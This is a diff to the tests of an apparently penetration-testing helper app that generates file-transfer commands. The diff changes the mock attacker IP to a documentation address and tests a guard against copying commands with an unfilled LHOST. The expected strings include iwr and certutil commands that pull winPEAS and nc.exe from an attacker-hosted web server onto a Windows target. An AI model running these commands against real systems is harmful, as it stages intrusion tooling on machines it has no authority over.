@@ -68,7 +68,7 @@ beforeEach(() => {
   setImported({ commands: [], cards: [], toolkit: TOOLKIT });
   m.vaultStatus.mockResolvedValue({ exists: true, unlocked: true });
   m.settingsGet.mockResolvedValue({
-    autoLockMinutes: 30, backupRetention: 14, machines: ["Kali (VM)"], attackerIp: "10.10.14.9", listenerPort: "4444", kaliUser: "kali",
+    autoLockMinutes: 30, backupRetention: 14, machines: ["Kali (VM)"], attackerIp: "192.0.2.9", listenerPort: "4444", kaliUser: "kali",
     windowsToolsDir: "~/tools/windows", linuxToolsDir: "~/tools/linux", fieldManualPath: "~/fm", nvdKeySet: false,
   });
   m.engagementsProgress.mockResolvedValue({});
@@ -102,22 +102,22 @@ describe("Transfer a file", () => {
     expect(g.getByText("2. On MS02")).toBeInTheDocument();
     expect(await pre(g, "cd ~/tools/windows && python3 -m http.server 80")).toBeInTheDocument();
     expect(
-      await pre(g, "iwr -Uri http://10.10.14.9/winPEASx64_ofs.exe -OutFile C:\\Windows\\Temp\\winPEASx64_ofs.exe -UseBasicParsing"),
+      await pre(g, "iwr -Uri http://192.0.2.9/winPEASx64_ofs.exe -OutFile C:\\Windows\\Temp\\winPEASx64_ofs.exe -UseBasicParsing"),
     ).toBeInTheDocument();
     // A staged file shows no warning. The folder follows the field and is remembered per OS.
     expect(g.queryByRole("note")).not.toBeInTheDocument();
     await user.type(g.getByRole("textbox", { name: "Folder" }), "C:\\Users\\Public");
-    expect(await pre(g, "iwr -Uri http://10.10.14.9/winPEASx64_ofs.exe -OutFile C:\\Users\\Public\\winPEASx64_ofs.exe -UseBasicParsing")).toBeInTheDocument();
+    expect(await pre(g, "iwr -Uri http://192.0.2.9/winPEASx64_ofs.exe -OutFile C:\\Users\\Public\\winPEASx64_ofs.exe -UseBasicParsing")).toBeInTheDocument();
     expect(localStorage.getItem("raven.transfer.dir.windows")).toBe("C:\\Users\\Public");
     // Another method is another tab; the serve command stays.
     await user.click(g.getByRole("tab", { name: "certutil" }));
-    expect(await pre(g, "certutil -urlcache -split -f http://10.10.14.9/winPEASx64_ofs.exe C:\\Users\\Public\\winPEASx64_ofs.exe")).toBeInTheDocument();
+    expect(await pre(g, "certutil -urlcache -split -f http://192.0.2.9/winPEASx64_ofs.exe C:\\Users\\Public\\winPEASx64_ofs.exe")).toBeInTheDocument();
     expect(g.getByText(commandText("cd ~/tools/windows && python3 -m http.server 80"))).toBeInTheDocument();
   });
 
   it("the Kali half serves from the tool folders set in Settings", async () => {
     m.settingsGet.mockResolvedValue({
-      autoLockMinutes: 30, backupRetention: 14, machines: ["Kali (VM)"], attackerIp: "10.10.14.9", listenerPort: "4444", kaliUser: "kali",
+      autoLockMinutes: 30, backupRetention: 14, machines: ["Kali (VM)"], attackerIp: "192.0.2.9", listenerPort: "4444", kaliUser: "kali",
       windowsToolsDir: "/opt/win tools", linuxToolsDir: "/opt/lin", fieldManualPath: "~/fm", nvdKeySet: false,
     });
     const user = userEvent.setup();
@@ -164,7 +164,7 @@ describe("Transfer a file", () => {
     await vi.waitFor(() => expect(m.logCreate).toHaveBeenCalled());
     expect(m.logCreate.mock.calls[0]![1]).toMatchObject({
       hostIds: ["ms02"],
-      content: { kind: "command", blocks: [{ command: "iwr -Uri http://10.10.14.9/nc.exe -OutFile C:\\Windows\\Temp\\nc.exe -UseBasicParsing" }] },
+      content: { kind: "command", blocks: [{ command: "iwr -Uri http://192.0.2.9/nc.exe -OutFile C:\\Windows\\Temp\\nc.exe -UseBasicParsing" }] },
     });
   });
 
@@ -208,7 +208,7 @@ describe("Transfer a file in Payloads: context and copy guard", () => {
     expect(await navigator.clipboard.readText()).toBe("untouched");
     expect(m.logCreate).not.toHaveBeenCalled();
     expect(screen.getByRole("complementary", { name: "Raven's read" }).querySelector("input[aria-label='LHOST']")).toHaveFocus();
-    expect(g.getByText("{LHOST} not filled. Press ↵ again to copy anyway")).toBeInTheDocument();
+    expect(g.getByText("{LHOST} not filled. Press ⌘↵ or Copy again to copy anyway")).toBeInTheDocument();
     await user.keyboard("{Meta>}{Enter}{/Meta}");
     await vi.waitFor(() => expect(m.logCreate).toHaveBeenCalled());
   });
@@ -227,14 +227,25 @@ describe("Transfer a file in Payloads: context and copy guard", () => {
     expect(await navigator.clipboard.readText()).toBe("untouched");
     const lhost = d.getByRole("textbox", { name: "LHOST" });
     expect(lhost).toHaveFocus();
-    // The target half's own Copy button goes through the same guard.
-    await user.click(g.getAllByRole("button", { name: /^Copy/ }).at(-1)!);
-    expect(await navigator.clipboard.readText()).toBe("untouched");
-    expect(lhost).toHaveFocus();
     await user.type(lhost, "192.0.2.10");
     await user.keyboard("{Meta>}{Enter}{/Meta}");
     await vi.waitFor(() => expect(m.logCreate).toHaveBeenCalled());
     expect(await navigator.clipboard.readText()).toBe("iwr -Uri http://192.0.2.10/nc.exe -OutFile C:\\Windows\\Temp\\nc.exe -UseBasicParsing");
+  });
+
+  it("one guard for Copy and ⌘↵", async () => {
+    blankIp();
+    const user = userEvent.setup();
+    mount("/payloads?generator=transfer");
+    const g = within(await generator());
+    await user.type(g.getByRole("combobox", { name: "Value for FILE" }), "nc.exe");
+    await navigator.clipboard.writeText("untouched");
+    await user.click(g.getAllByRole("button", { name: /^Copy/ }).at(-1)!);
+    expect(await navigator.clipboard.readText()).toBe("untouched");
+    expect(await g.findByText("{LHOST} not filled. Press ⌘↵ or Copy again to copy anyway")).toBeInTheDocument();
+    await user.keyboard("{Meta>}{Enter}{/Meta}");
+    await vi.waitFor(() => expect(m.logCreate).toHaveBeenCalled());
+    expect(await navigator.clipboard.readText()).toBe("iwr -Uri http://{LHOST}/nc.exe -OutFile C:\\Windows\\Temp\\nc.exe -UseBasicParsing");
   });
 });
 
